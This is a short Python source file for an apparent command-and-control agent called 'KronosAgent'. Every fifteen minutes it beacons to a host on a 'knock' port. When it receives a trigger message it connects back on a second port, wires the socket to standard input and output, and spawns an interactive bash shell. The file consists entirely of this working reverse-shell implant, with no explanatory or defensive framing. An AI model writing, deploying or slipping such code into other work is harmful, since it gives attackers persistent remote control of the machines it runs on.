from os import dup2
import socket
import pty
import time
import threading
from subprocess import run

KNOCK_PORT = 31415
HTTPS_PORT = 31416
HOST = socket.gethostbyname(socket.gethostname())

class KronosAgent():

    def __init__(self, host):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.knock_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.knock_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.host = host

    def interact(self):
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.connect((self.host, HTTPS_PORT))
            print("Connecting to "+ str((self.host, HTTPS_PORT)))
            for x in range(0,3):
                dup2(s.fileno(), x) 
            pty.spawn("/bin/bash")
            print("Shell spawned")

    def health_check(self):
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.connect((self.host, KNOCK_PORT))
            s.sendall(b'Knock')
            data = s.recv(1024)
            print(data)
            if data == b'Knock':
                pass
            elif data == b'HTTPS Start':
                threading.Thread(target=self.interact(), args=()).start()
                
            else:
                print("Agent Recieved unxpected data " + str(data))
                exit()  

def main():
    k = KronosAgent(HOST)
    while True:
        k.health_check()
        time.sleep((60*15))
main()